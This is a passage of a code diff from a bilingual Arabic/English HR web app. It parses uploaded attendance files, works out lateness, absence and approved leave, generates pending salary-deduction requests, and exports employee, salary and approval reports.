+      .flatMap((report) => {
+        const reportDate = normalizeDateString(report?.date) || "";
+        return (Array.isArray(report?.rows) ? report.rows : []).map((row, index) => ({
+          id: row.id || `history-${report.id || reportDate}-${row.phone || index}`,
+          reportId: report.id || reportDate,
+          date: reportDate,
+          sourceFileName: report.fileName || "",
+          name: row.name || "-",
+          phone: row.phone || "-",
+          department: row.department || "-",
+          scheduledIn: row.scheduledIn || "-",
+          scheduledOut: row.scheduledOut || "-",
+          actualIn: row.actualIn || "-",
+          actualOut: row.actualOut || "-",
+          delayMinutes: timeToMinutes(row.delayLabel),
+          delayLabel: row.delayLabel || (language === "ar" ? "لا يوجد" : "None"),
+          status: row.status || "-",
+          reason: row.reason || "-",
+        }));
+      })
+      .filter((row) => {
+        if (attendanceEmployeeFilter !== "all" && String(row.phone) !== String(attendanceEmployeeFilter)) return false;
+        if (attendanceDateFilter && !isSameNormalizedDate(row.date, attendanceDateFilter)) return false;
+        return true;
+      })
+      .sort((a, b) => String(b.date || "").localeCompare(String(a.date || "")) || String(a.name || "").localeCompare(String(b.name || ""), "ar"));
+  }, [scopedSavedAttendanceReports, attendanceEmployeeFilter, attendanceDateFilter, language]);
+
+  const attendanceRows = useMemo(() => {
+    if (isEmployee) return attendanceHistoryRows;
+    if (!selectedAttendanceReport) return [];
+
+    const sourceRows = Array.isArray(selectedAttendanceReport.rows) ? selectedAttendanceReport.rows : [];
+    return sourceRows
+      .filter((row) => attendanceEmployeeFilter === "all" ? true : String(row.phone) === String(attendanceEmployeeFilter))
+      .map((row, index) => ({
+        id: row.id || `saved-${attendanceDateFilter}-${row.phone || index}`,
+        date: normalizeDateString(selectedAttendanceReport?.date) || normalizeDateString(attendanceDateFilter) || "",
+        sourceFileName: selectedAttendanceReport?.fileName || "",
+        name: row.name || "-",
+        phone: row.phone || "-",
+        department: row.department || "-",
+        scheduledIn: row.scheduledIn || "-",
+        scheduledOut: row.scheduledOut || "-",
+        actualIn: row.actualIn || "-",
+        actualOut: row.actualOut || "-",
+        delayMinutes: timeToMinutes(row.delayLabel),
+        delayLabel: row.delayLabel || (language === "ar" ? "لا يوجد" : "None"),
+        status: row.status || "-",
+        reason: row.reason || "-",
+      }));
+  }, [isEmployee, attendanceHistoryRows, selectedAttendanceReport, attendanceEmployeeFilter, attendanceDateFilter, language]);
+
+  const attendanceReportEmptyMessage = useMemo(() => {
+    if (isEmployee) {
+      if (attendanceDateFilter) {
+        return language === "ar" ? "لا توجد حركات بصمة لهذا اليوم" : "No attendance movements for this day.";
+      }
+      return language === "ar" ? "لا توجد حركات بصمة محفوظة لهذا الموظف" : "No saved attendance movements for this employee.";
+    }
+    if (!selectedAttendanceReport) {
+      return language === "ar" ? "لم يتم تنزيل تقرير لهذا اليوم" : "No attendance report was uploaded for this day.";
+    }
+    if (!attendanceRows.length) {
+      return language === "ar" ? "لا توجد بيانات لهذا الموظف في التقرير" : "No data for this employee in the saved report.";
+    }
+    return "";
+  }, [isEmployee, selectedAttendanceReport, attendanceRows.length, attendanceDateFilter, language]);
+
+  const openAttendanceHistoryModal = (row) => {
+    if (!row?.phone) return;
+    const employeeMatch = visibleEmployees.find((emp) => String(emp.phone) === String(row.phone));
+    setAttendanceHistoryEmployee({
+      name: row.name || employeeMatch?.name || "-",
+      phone: row.phone,
+      department: row.department || employeeMatch?.department || "-",
+    });
+    setAttendanceHistoryDateFilter("");
+    setAttendanceHistoryModalOpen(true);
+  };
+
+  const attendanceHistoryModalRows = useMemo(() => {
+    if (!attendanceHistoryEmployee?.phone) return [];
+    return scopedSavedAttendanceReports
+      .flatMap((report) => {
+        const reportDate = normalizeDateString(report?.date) || "";
+        return (Array.isArray(report?.rows) ? report.rows : [])
+          .filter((row) => String(row?.phone || "") === String(attendanceHistoryEmployee.phone))
+          .map((row, index) => ({
+            id: row.id || `modal-${report.id || reportDate}-${index}`,
+            date: reportDate,
+            sourceFileName: report.fileName || "",
+            name: row.name || attendanceHistoryEmployee.name || "-",
+            phone: row.phone || attendanceHistoryEmployee.phone,
+            department: row.department || attendanceHistoryEmployee.department || "-",
+            scheduledIn: row.scheduledIn || "-",
+            scheduledOut: row.scheduledOut || "-",
+            actualIn: row.actualIn || "-",
+            actualOut: row.actualOut || "-",
+            delayLabel: row.delayLabel || (language === "ar" ? "لا يوجد" : "None"),
+            status: row.status || "-",
+            reason: row.reason || "-",
+          }));
+      })
+      .filter((row) => !attendanceHistoryDateFilter || isSameNormalizedDate(row.date, attendanceHistoryDateFilter))
+      .sort((a, b) => String(b.date || "").localeCompare(String(a.date || "")));
+  }, [scopedSavedAttendanceReports, attendanceHistoryEmployee, attendanceHistoryDateFilter, language]);
+
+  const detectAttendanceDateFromFileName = (fileName = "") => {
+    const normalized = String(fileName || "").trim();
+    if (!normalized) return "";
+    const match = normalized.match(/(\d{4})[-_/](\d{2})[-_/](\d{2})/);
+    if (match) return `${match[1]}-${match[2]}-${match[3]}`;
+    return normalizeDateString(normalized);
+  };
+
+  const parseAttendanceUploadText = (rawText, fileName = "") => {
+    const textValue = String(rawText || "").replace(/^﻿/, "").trim();
+    if (!textValue) return [];
+
+    const normalizeHeader = (value) => String(value || "")
+      .replace(/^﻿/, "")
+      .trim()
+      .replace(/\s+/g, " ")
+      .toLowerCase();
+    const simpleKnownHeaders = [
+      "الاسم", "name", "employee", "employee name", "full name",
+      "رقم الهاتف", "الهاتف", "رقم الجوال", "الجوال", "phone", "mobile", "phone number", "mobile number",
+      "التاريخ", "date", "attendance date",
+      "وقت الحضور", "الحضور", "وقت الدخول", "check in", "check-in", "checkin", "in", "actual in", "time in",
+      "وقت الانصراف", "الانصراف", "وقت الخروج", "check out", "check-out", "checkout", "out", "actual out", "time out",
+    ].map(normalizeHeader);
+
+    const looksLikeAttendanceHeaders = (headers = []) => {
+      const headerSet = new Set(headers.map(normalizeHeader).filter(Boolean));
+      const requiredGroups = [
+        ["الاسم", "name", "employee", "employee name", "full name"],
+        ["رقم الهاتف", "الهاتف", "رقم الجوال", "الجوال", "phone", "mobile", "phone number", "mobile number"],
+        ["التاريخ", "date", "attendance date"],
+        ["وقت الحضور", "الحضور", "وقت الدخول", "check in", "check-in", "checkin", "in", "actual in", "time in"],
+        ["وقت الانصراف", "الانصراف", "وقت الخروج", "check out", "check-out", "checkout", "out", "actual out", "time out"],
+      ];
+      return requiredGroups.every((group) => group.map(normalizeHeader).some((header) => headerSet.has(header)));
+    };
+
+    const mapUploadedRow = (headerMap, row) => {
+      const readValue = (...keys) => {
+        for (const key of keys) {
+          const index = headerMap.get(normalizeHeader(key));
+          if (index != null && row[index] != null && String(row[index]).trim() !== "") {
+            return String(row[index]).trim();
+          }
+        }
+        return "";
+      };
+
+      return {
+        name: readValue("الاسم", "name", "employee", "employee name", "full name"),
+        phone: normalizeUploadedPhone(readValue("رقم الهاتف", "الهاتف", "رقم الجوال", "الجوال", "phone", "mobile", "phone number", "mobile number")),
+        date: normalizeUploadedDate(readValue("التاريخ", "date", "attendance date")),
+        actualIn: normalizeUploadedTime(readValue("وقت الحضور", "الحضور", "وقت الدخول", "check in", "check-in", "checkin", "in", "actual in", "time in")),
+        actualOut: normalizeUploadedTime(readValue("وقت الانصراف", "الانصراف", "وقت الخروج", "check out", "check-out", "checkout", "out", "actual out", "time out")),
+      };
+    };
+
+    const parseDelimitedLine = (line, delimiter) => {
+      const cells = [];
+      let current = "";
+      let inQuotes = false;
+      for (let i = 0; i < line.length; i += 1) {
+        const char = line[i];
+        if (char === '"') {
+          if (inQuotes && line[i + 1] === '"') {
+            current += '"';
+            i += 1;
+          } else {
+            inQuotes = !inQuotes;
+          }
+          continue;
+        }
+        if (char === delimiter && !inQuotes) {
+          cells.push(current.trim());
+          current = "";
+          continue;
+        }
+        current += char;
+      }
+      cells.push(current.trim());
+      return cells.map((cell) => cell.replace(/^"|"$/g, "").trim());
+    };
+
+    const fromDelimitedText = (delimiter) => {
+      const lines = textValue.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
+      if (lines.length < 2) return [];
+      const rows = lines.map((line) => parseDelimitedLine(line, delimiter));
+      if (!looksLikeAttendanceHeaders(rows[0])) return [];
+      const headerMap = new Map(rows[0].map((header, index) => [normalizeHeader(header), index]));
+      return rows.slice(1).map((row) => mapUploadedRow(headerMap, row)).filter((row) => row.name || row.phone);
+    };
+
+    if (/<table[\s>]/i.test(textValue)) {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(textValue, "text/html");
+      const tables = Array.from(doc.querySelectorAll("table"));
+      for (const table of tables) {
+        const trs = Array.from(table.querySelectorAll("tr"));
+        if (trs.length < 2) continue;
+        const headers = Array.from(trs[0].querySelectorAll("th,td")).map((cell) => cell.textContent?.trim() || "");
+        if (!looksLikeAttendanceHeaders(headers)) continue;
+        const headerMap = new Map(headers.map((header, index) => [normalizeHeader(header), index]));
+        const rows = trs.slice(1).map((tr) => {
+          const cells = Array.from(tr.querySelectorAll("td,th")).map((cell) => cell.textContent?.trim() || "");
+          return mapUploadedRow(headerMap, cells);
+        }).filter((row) => row.name || row.phone);
+        if (rows.length) return rows;
+      }
+
+      if (/<frame|<frameset|sheet\d+\.htm|File-List/i.test(textValue)) {
+        throw new Error(
+          language === "ar"
+            ? `ملف ${fileName || "Excel"} هو صفحة Excel مرتبطة بملفات مساعدة ناقصة، وليس فيه جدول البصمة داخل نفس الملف. استخدم CSV أو XLSX أو HTML يحتوي الجدول نفسه.`
+            : `${fileName || "Excel file"} is an Excel frameset that depends on missing companion files. Use CSV, XLSX, or HTML that contains the table in the same file.`
+        );
+      }
+    }
+
+    if (/	/.test(textValue)) return fromDelimitedText("	");
+    const semicolonRows = fromDelimitedText(";");
+    if (semicolonRows.length) return semicolonRows;
+    return fromDelimitedText(",");
+  };
+
+  const decodeAttendanceUploadFile = async (file) => {
+    const fileName = String(file?.name || "").toLowerCase();
+    const buffer = await file.arrayBuffer();
+
+    if (fileName.endsWith(".xlsx") || fileName.endsWith(".xlsm") || fileName.endsWith(".xltx") || fileName.endsWith(".xltm")) {
+      try {
+        const workbook = XLSX.read(buffer, { type: "array", cellDates: false, raw: false });
+        for (const sheetName of workbook.SheetNames || []) {
+          const worksheet = workbook.Sheets?.[sheetName];
+          if (!worksheet) continue;
+          const rows = XLSX.utils.sheet_to_json(worksheet, { header: 1, raw: false, defval: "" });
+          if (!rows.length) continue;
+          const headerMap = new Map(rows[0].map((header, index) => [String(header || "").replace(/^﻿/, "").trim().replace(/\s+/g, " ").toLowerCase(), index]));
+          const parsedRows = rows.slice(1).map((row) => ({
+            name: String(row[headerMap.get("name")] ?? row[headerMap.get("الاسم")] ?? "").trim(),
+            phone: normalizeUploadedPhone(String(row[headerMap.get("phone")] ?? row[headerMap.get("رقم الهاتف")] ?? "").trim()),
+            date: normalizeUploadedDate(String(row[headerMap.get("date")] ?? row[headerMap.get("التاريخ")] ?? "").trim()),
+            actualIn: normalizeUploadedTime(String(row[headerMap.get("checkin")] ?? row[headerMap.get("وقت الحضور")] ?? "").trim()),
+            actualOut: normalizeUploadedTime(String(row[headerMap.get("checkout")] ?? row[headerMap.get("وقت الانصراف")] ?? "").trim()),
+          })).filter((row) => row.name || row.phone);
+          if (parsedRows.length) {
+            return { text: "", rows: parsedRows, encoding: "xlsx" };
+          }
+        }
+      } catch (xlsxError) {
+        console.error("XLSX parsing failed:", xlsxError);
+      }
+    }
+
+    const decoders = ["utf-8", "windows-1256", "iso-8859-6", "windows-1252"];
+    for (const encoding of decoders) {
+      try {
+        const decoded = new TextDecoder(encoding).decode(buffer);
+        const rows = parseAttendanceUploadText(decoded, file?.name || "");
+        if (rows.length) {
+          return { text: decoded, rows, encoding };
+        }
+      } catch {}
+    }
+    const fallback = await file.text();
+    return { text: fallback, rows: parseAttendanceUploadText(fallback, file?.name || ""), encoding: "browser-default" };
+  };
+
+  const getOverlappingLeaveRequests = (employeePhone, fromValue, toValue, options = {}) => {
+    const normalizedFrom = normalizeLeaveDateValue(fromValue);
+    const normalizedTo = normalizeLeaveDateValue(toValue || fromValue);
+    const includePending = Boolean(options.includePending);
+    const excludeId = options.excludeId;
+    if (!employeePhone || !normalizedFrom || !normalizedTo) return [];
+
+    return requests.filter((req) => {
+      if (req?.type !== "إجازة") return false;
+      if (req?.employeePhone !== employeePhone) return false;
+      if (excludeId != null && req?.id === excludeId) return false;
+      if (!(req?.status === "معتمد" || (includePending && req?.status === "بانتظار الاعتماد"))) return false;
+
+      const existingFrom = normalizeLeaveDateValue(req?.leaveFrom);
+      const existingTo = normalizeLeaveDateValue(req?.leaveTo || req?.leaveFrom);
+      if (!existingFrom || !existingTo) return false;
+
+      return normalizedFrom <= existingTo && normalizedTo >= existingFrom;
+    });
+  };
+
+  const findApprovedLeaveForDate = (employeePhone, targetDate) => {
+    const normalizedTargetDate = normalizeDateString(targetDate);
+    if (!employeePhone || !normalizedTargetDate) return null;
+
+    return requests
+      .filter((req) => {
+        const fromDate = normalizeLeaveDateValue(req?.leaveFrom);
+        const toDate = normalizeLeaveDateValue(req?.leaveTo || req?.leaveFrom);
+        return req?.employeePhone === employeePhone
+          && req?.status === "معتمد"
+          && req?.type === "إجازة"
+          && fromDate
+          && toDate
+          && normalizedTargetDate >= fromDate
+          && normalizedTargetDate <= toDate;
+      })
+      .sort((a, b) => {
+        const aUpdated = new Date(a?.updatedAt || a?.decidedAt || a?.createdAt || 0).getTime();
+        const bUpdated = new Date(b?.updatedAt || b?.decidedAt || b?.createdAt || 0).getTime();
+        if (aUpdated !== bUpdated) return bUpdated - aUpdated;
+        return Number(b?.id || 0) - Number(a?.id || 0);
+      })[0] || null;
+  };
+
+  const findApprovedLateForDate = (employeePhone, targetDate) => {
+    const normalizedTargetDate = normalizeDateString(targetDate);
+    if (!employeePhone || !normalizedTargetDate) return null;
+    return requests.find((req) => {
+      const reqDate = normalizeDateString(req?.createdAt || req?.submittedAt || req?.leaveFrom || req?.decidedAt);
+      return req?.employeePhone === employeePhone
+        && req?.status === "معتمد"
+        && req?.type === "تأخير"
+        && reqDate
+        && reqDate === normalizedTargetDate;
+    }) || null;
+  };
+
+  const buildAdjustedAttendanceRows = (uploadedRows = [], targetDateOverride = "") => {
+    const normalizedTargetDate = normalizeDateString(targetDateOverride || attendanceDateFilter);
+    const uploadedByPhone = new Map();
+    const uploadedByName = new Map();
+
+    uploadedRows.forEach((row) => {
+      const rowDate = normalizeUploadedDate(row?.date || normalizedTargetDate);
+      if (normalizedTargetDate && rowDate && rowDate !== normalizedTargetDate) return;
+      const normalizedPhone = String(row?.phone || "").trim();
+      const normalizedName = String(row?.name || "").trim();
+      const normalizedRow = {
+        ...row,
+        date: rowDate || normalizedTargetDate,
+        actualIn: String(row?.actualIn || "").trim(),
+        actualOut: String(row?.actualOut || "").trim(),
+      };
+      if (normalizedPhone) uploadedByPhone.set(normalizedPhone, normalizedRow);
+      if (normalizedName) uploadedByName.set(normalizedName, normalizedRow);
+    });
+
+    return visibleEmployees.map((emp, index) => {
+      const uploadedRow = uploadedByPhone.get(String(emp.phone || "").trim()) || uploadedByName.get(String(emp.name || "").trim()) || null;
+      const scheduledIn = emp.fromHour || "-";
+      const scheduledOut = emp.toHour || "-";
+      const approvedLeave = findApprovedLeaveForDate(emp.phone, normalizedTargetDate);
+      const approvedLate = findApprovedLateForDate(emp.phone, normalizedTargetDate);
+
+      if (!uploadedRow) {
+        if (approvedLeave) {
+          return {
+            id: `uploaded-${emp.phone || index}-leave-${normalizedTargetDate}`,
+            name: emp.name || "-",
+            phone: emp.phone || "-",
+            department: emp.department || "-",
+            scheduledIn,
+            scheduledOut,
+            actualIn: language === "ar" ? "إجازة" : "On leave",
+            actualOut: language === "ar" ? "إجازة" : "On leave",
+            delayMinutes: 0,
+            delayLabel: language === "ar" ? "إجازة" : "Leave",
+            status: language === "ar" ? "إجازة معتمدة" : "Approved leave",
+            reason: approvedLeave.reason || "-",
+            date: normalizedTargetDate,
+          };
+        }
+
+        return {
+          id: `uploaded-${emp.phone || index}-absent-${normalizedTargetDate}`,
+          name: emp.name || "-",
+          phone: emp.phone || "-",
+          department: emp.department || "-",
+          scheduledIn,
+          scheduledOut,
+          actualIn: "-",
+          actualOut: "-",
+          delayMinutes: 0,
+          delayLabel: language === "ar" ? "لا يوجد" : "None",
+          status: language === "ar" ? "غياب" : "Absent",
+          reason: language === "ar" ? "لا توجد بصمة لهذا اليوم" : "No attendance punch for this day",
+          date: normalizedTargetDate,
+        };
+      }
+
+      const actualInBase = uploadedRow.actualIn || "-";
+      const actualOutBase = uploadedRow.actualOut || "-";
+      const actualInValue = approvedLate?.lateTo || actualInBase;
+      const actualOutValue = approvedLate?.compensateAt || actualOutBase;
+      const plannedInMinutes = timeToMinutes(emp.fromHour);
+      const actualInMinutes = timeToMinutes(actualInValue);
+      const delayMinutes = plannedInMinutes != null && actualInMinutes != null ? Math.max(0, actualInMinutes - plannedInMinutes) : 0;
+      const hasActualPunch = actualInBase !== "-" || actualOutBase !== "-";
+
+      let status = language === "ar" ? "حضور طبيعي" : "Regular attendance";
+      let reason = "-";
+      if (approvedLeave) {
+        status = language === "ar" ? "إجازة معتمدة" : "Approved leave";
+        reason = approvedLeave.reason || "-";
+      } else if (!hasActualPunch) {
+        status = language === "ar" ? "غياب" : "Absent";
+        reason = language === "ar" ? "لا توجد بصمة لهذا اليوم" : "No attendance punch for this day";
+      } else if (approvedLate) {
+        status = language === "ar" ? "تأخير معتمد" : "Approved late";
+        reason = approvedLate.reason || "-";
+      } else if (delayMinutes > 0) {
+        status = language === "ar" ? "متأخر" : "Late";
+        reason = language === "ar" ? "تم احتساب التأخير تلقائيًا" : "Delay calculated automatically";
+      }
+
+      return {
+        id: `uploaded-${emp.phone || index}-${normalizedTargetDate}`,
+        name: emp.name || uploadedRow.name || "-",
+        phone: emp.phone || uploadedRow.phone || "-",
+        department: emp.department || "-",
+        scheduledIn,
+        scheduledOut,
+        actualIn: approvedLeave ? (language === "ar" ? "إجازة" : "On leave") : actualInValue,
+        actualOut: approvedLeave ? (language === "ar" ? "إجازة" : "On leave") : actualOutValue,
+        delayMinutes,
+        delayLabel: approvedLate
+          ? (language === "ar" ? "تأخير معتمد" : "Approved late")
+          : minutesToDelayLabel(delayMinutes, language),
+        status,
+        reason,
+        date: normalizedTargetDate,
+      };
+    });
+  };
+
+  const calculateAttendanceDeductionAmount = (employee, kind = "absence", delayMinutes = 0) => {
+    if (!employee) return 0;
+    const salaryBase = Math.max(0, Number(employee.salary || employee.basicSalary || 0));
+    const deductionMode = kind === "late"
+      ? (employee.attendanceLateDeductionMode || "automatic")
+      : (employee.attendanceAbsenceDeductionMode || "automatic");
+    const valueType = kind === "late"
+      ? (employee.attendanceLateValueType || "amount")
+      : (employee.attendanceAbsenceValueType || "amount");
+    const configuredValue = Math.max(0, Number(kind === "late" ? employee.attendanceLateValue || 0 : employee.attendanceAbsenceValue || 0));
+
+    if (deductionMode === "manual") return 0;
+    if (valueType === "percentage") {
+      return Math.max(0, (salaryBase * configuredValue) / 100);
+    }
+    return kind === "late" && configuredValue <= 0 && delayMinutes > 0 ? delayMinutes : configuredValue;
+  };
+
+  const buildAttendanceDeductionRequests = (rows = [], reportDate = "") => {
+    const normalizedReportDate = normalizeDateString(reportDate);
+    if (!normalizedReportDate) return [];
+
+    return rows.flatMap((row) => {
+      const employee = visibleEmployees.find((emp) => String(emp.phone || "") === String(row.phone || ""));
+      if (!employee) return [];
+
+      const normalizedRowDate = normalizeDateString(row.date || normalizedReportDate) || normalizedReportDate;
+      const list = [];
+
+      if (String(row.status || "") === "غياب") {
+        const amount = calculateAttendanceDeductionAmount(employee, "absence", 0);
+        list.push({
+          id: Date.now() + Math.floor(Math.random() * 1000000),
+          employeePhone: employee.phone,
+          employeeName: employee.name,
+          department: employee.department,
+          managerDepartment: employee.managerDepartment,
+          type: "خصم",
+          amount,
+          percentage: employee.attendanceAbsenceValueType === "percentage" ? Number(employee.attendanceAbsenceValue || 0) : 0,
+          valueType: employee.attendanceAbsenceValueType || "amount",
+          resolvedAmount: amount,
+          deductionMode: employee.attendanceAbsenceDeductionMode || "automatic",
+          reason: `خصم بصمة - غياب يوم ${normalizedRowDate}`,
+          status: "بانتظار الاعتماد",
+          approver: "HR / المالك",
+          decidedBy: "",
+          canDecide: true,
+          createdByRole: "system",
+          createdAt: new Date().toISOString(),
+          deductionSource: "attendance",
+          attendancePenaltyKind: "absence",
+          attendanceDate: normalizedRowDate,
+        });
+      }
+
+      if (String(row.status || "") === "متأخر" && Number(row.delayMinutes || 0) > 0) {
+        const amount = calculateAttendanceDeductionAmount(employee, "late", Number(row.delayMinutes || 0));
+        list.push({
+          id: Date.now() + Math.floor(Math.random() * 1000000) + 1,
+          employeePhone: employee.phone,
+          employeeName: employee.name,
+          department: employee.department,
+          managerDepartment: employee.managerDepartment,
+          type: "خصم",
+          amount,
+          percentage: employee.attendanceLateValueType === "percentage" ? Number(employee.attendanceLateValue || 0) : 0,
+          valueType: employee.attendanceLateValueType || "amount",
+          resolvedAmount: amount,
+          deductionMode: employee.attendanceLateDeductionMode || "automatic",
+          reason: `خصم بصمة - تأخير ${Number(row.delayMinutes || 0)} دقيقة يوم ${normalizedRowDate}`,
+          status: "بانتظار الاعتماد",
+          approver: "HR / المالك",
+          decidedBy: "",
+          canDecide: true,
+          createdByRole: "system",
+          createdAt: new Date().toISOString(),
+          deductionSource: "attendance",
+          attendancePenaltyKind: "late",
+          attendanceDate: normalizedRowDate,
+        });
+      }
+
+      return list;
+    });
+  };
+
+  const handleAttendanceUploadToSystem = async (event) => {
+    const file = event.target.files?.[0];
+    if (!file) return;
+
+    try {
+      setAttendanceUploadStatus(language === "ar" ? "جاري قراءة الملف..." : "Reading file...");
+      const { rows: uploadedRows } = await decodeAttendanceUploadFile(file);
+
+      if (!uploadedRows.length) {
+        throw new Error(language === "ar" ? "الملف لا يحتوي على بيانات بصمة مفهومة أو أن تنسيق الأعمدة غير مدعوم" : "The file does not contain readable attendance rows or the column format is unsupported.");
+      }
+
+      const detectedFileDate = detectAttendanceDateFromFileName(file.name);
+      const detectedRowDate = normalizeUploadedDate(uploadedRows.find((row) => row?.date)?.date || "");
+      const effectiveReportDate = normalizeUploadedDate(detectedFileDate || detectedRowDate || attendanceDateFilter);
+      const previousFilterDate = normalizeDateString(attendanceDateFilter);
+      const adjustedRows = buildAdjustedAttendanceRows(uploadedRows, effectiveReportDate);
+
+      if (!effectiveReportDate) {
+        throw new Error(language === "ar" ? "تعذر تحديد تاريخ التقرير. أضف التاريخ في اسم الملف أو داخل عمود التاريخ." : "Could not determine the report date. Add the date in the filename or inside the date column.");
+      }
+
+      const reportEntry = {
+        id: Date.now(),
+        createdAt: new Date().toISOString(),
+        createdBy: authUser?.name || "-",
+        createdByRole: authUser?.role || "-",
+        fileName: file.name || "attendance-report",
+        date: effectiveReportDate,
+        employeeFilter: "all",
+        source: "uploaded_file",
+        rows: adjustedRows.map((row) => ({
+          name: row.name,
+          phone: row.phone,
+          department: row.department,
+          scheduledIn: row.scheduledIn,
+          scheduledOut: row.scheduledOut,
+          actualIn: row.actualIn,
+          actualOut: row.actualOut,
+          delayLabel: row.delayLabel,
+          status: row.status,
+          reason: row.reason,
+          date: row.date || effectiveReportDate,
+        })),
+      };
+
+      const attendanceGeneratedRequests = buildAttendanceDeductionRequests(adjustedRows, effectiveReportDate);
+      const existingReports = readStorage(STORAGE_KEYS.attendanceReports, [], isArray);
+      const nextReports = [reportEntry, ...existingReports.filter((item) => String(normalizeDateString(item.date)) !== String(reportEntry.date))].slice(0, 200);
+      const nextRequests = [
+        ...attendanceGeneratedRequests,
+        ...requests.filter((req) => !(req.deductionSource === "attendance" && normalizeDateString(req.attendanceDate) === normalizeDateString(effectiveReportDate) && req.status === "بانتظار الاعتماد")),
+      ];
+      if (typeof window !== "undefined") {
+        window.localStorage.setItem(STORAGE_KEYS.attendanceReports, JSON.stringify(nextReports));
+        setAttendanceDateFilter(effectiveReportDate);
+        setAttendanceEmployeeFilter("all");
+        setAttendanceReportsVersion((prev) => prev + 1);
+        setRequests(nextRequests);
+        if (effectiveReportDate && previousFilterDate && effectiveReportDate !== previousFilterDate) {
+          window.alert(language === "ar"
+            ? `تم رفع التقرير بنجاح. تم اعتماد تاريخ ${effectiveReportDate} تلقائيًا.`
+            : `The report was uploaded successfully. The date ${effectiveReportDate} was applied automatically.`);
+        } else {
+          window.alert(language === "ar" ? "تم تنزيل تقرير البصمة إلى السستم بنجاح" : "Attendance report was uploaded to the system successfully.");
+        }
+      }
+      await forceRemoteSaveSnapshot({
+        employees,
+        requests: nextRequests,
+        users: systemUsers,
+        pending: pendingAccounts,
+        upgrades: upgradeRequests,
+        complaints,
+        chats,
+        chatCalls,
+      });
+      setAttendanceUploadStatus(language === "ar"
+        ? `تم رفع الملف: ${file.name} — تم احتساب التأخير والغياب والإجازات تلقائيًا وإنشاء طلبات خصم بانتظار الاعتماد.`
+        : `Uploaded: ${file.name} — delays, absences, and leaves were calculated automatically and deduction requests were created pending approval.`);
+    } catch (error) {
+      console.error("Uploading attendance report failed:", error);
+      const message = error?.message || (language === "ar" ? "تعذر تنزيل التقرير إلى السستم" : "Could not upload the report to the system.");
+      setAttendanceUploadStatus(message);
+      if (typeof window !== "undefined") {
+        window.alert(message);
+      }
+    } finally {
+      event.target.value = "";
+    }
+  };
+
+  const exportAttendanceReport = () => {
+    const headers = language === "ar"
+      ? ["الاسم", "رقم الهاتف", "الإدارة", "التاريخ", "الدخول المجدول", "الخروج المجدول", "الدخول الفعلي", "الخروج الفعلي", "التأخير", "الحالة", "الملاحظة"]
+      : ["Name", "Phone", "Department", "Date", "Scheduled In", "Scheduled Out", "Actual In", "Actual Out", "Delay", "Status", "Note"];
+
+    const rows = attendanceRows.map((row) => [
+      row.name,
+      row.phone,
+      row.department,
+      attendanceDateFilter,
+      row.scheduledIn,
+      row.scheduledOut,
+      row.actualIn,
+      row.actualOut,
+      row.delayLabel,
+      row.status,
+      row.reason,
+    ]);
+
+    downloadExcelLikeFile(`attendance-report-${attendanceDateFilter || "report"}.xls`, headers, rows);
+  };
+
+
+  const exportRowsToExcel = (filename, headers, rows) => {
+    downloadExcelLikeFile(filename, headers, rows);
+  };
+
+  const exportEmployeeDataReport = () => {
+    const headers = language === "ar"
+      ? ["الاسم", "الفرع", "رقم الهاتف", "الإدارة"]
+      : ["Name", "Branch", "Phone", "Department"];
+    const rows = filteredEmployees.map((emp) => [
+      emp.name || "-",
+      emp.location || emp.branch || "-",
+      emp.phone || "-",
+      emp.department || "-",
+    ]);
+    exportRowsToExcel(`employees-data-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportSalaryDataReport = () => {
+    const headers = language === "ar"
+      ? ["الاسم", "الإدارة", "المرتب الأساسي", "رقم الهاتف", "الفرع", "الصافي"]
+      : ["Name", "Department", "Basic Salary", "Phone", "Branch", "Net"];
+    const rows = filteredEmployees.map((emp) => {
+      const net = Number(emp.salary || 0) - Number(emp.advance || 0);
+      return [
+        emp.name || "-",
+        emp.department || "-",
+        currency(emp.basicSalary || emp.salary),
+        emp.phone || "-",
+        emp.location || "-",
+        currency(net),
+      ];
+    });
+    exportRowsToExcel(`salary-net-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportLeaveManagementReport = () => {
+    const headers = language === "ar"
+      ? ["الاسم", "الإدارة", "رصيد الإجازات", "عدد ساعات العمل", "من ساعة", "إلى ساعة", "الفترة"]
+      : ["Name", "Department", "Leave Balance", "Daily Work Hours", "From", "To", "Shift"];
+    const rows = filteredEmployees.map((emp) => [
+      emp.name || "-",
+      emp.department || "-",
+      emp.leaveBalance ?? "-",
+      emp.workHours ?? "-",
+      emp.fromHour || "-",
+      emp.toHour || "-",
+      emp.shift === "evening" ? t.evening : t.morning,
+    ]);
+    exportRowsToExcel(`leave-management-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportLeaveApprovalsReport = () => {
+    const headers = language === "ar"
+      ? ["الموظف", "النوع", "التاريخ / الوقت", "سبب الطلب", "الحالة", "اعتمد بواسطة"]
+      : ["Employee", "Type", "Date / Time", "Reason", "Status", "Approved By"];
+    const rows = requestHubLeaveRequests.map((req) => [
+      req.employeeName || "-",
+      req.type || "-",
+      req.type === "إجازة"
+        ? `${req.leaveFrom || "-"} → ${req.leaveTo || "-"}`
+        : `${req.lateFrom || "-"} → ${req.lateTo || "-"}${req.compensateAt ? ` | ${t.compensateAt}: ${req.compensateAt}` : ""}`,
+      req.reason || "-",
+      req.status || "-",
+      req.decidedBy || "-",
+    ]);
+    exportRowsToExcel(`leave-late-approvals-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportFinancialApprovalsReport = () => {
+    const headers = language === "ar"
+      ? ["الموظف", "النوع", "القيمة", "سبب الطلب", "الحالة", "اعتمد بواسطة"]
+      : ["Employee", "Type", "Amount", "Reason", "Status", "Approved By"];
+    const rows = requestHubFinancialRequests.map((req) => [
+      req.employeeName || "-",
+      req.type || "-",
+      currency(req.resolvedAmount || req.amount),
+      req.reason || "-",
+      req.status || "-",
+      req.decidedBy || "-",
+    ]);
+    exportRowsToExcel(`financial-approvals-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportApprovalLogReport = (logType) => {
+    const source = logType === "leave" ? approvalLogLeaveRequests : approvalLogFinancialRequests;
+    const headers = logType === "leave"
+      ? (language === "ar"
+          ? ["الموظف", "النوع", "التاريخ / الوقت", "سبب الطلب", "الحالة", "اعتمد بواسطة"]
+          : ["Employee", "Type", "Date / Time", "Reason", "Status", "Approved By"])
+      : (language === "ar"
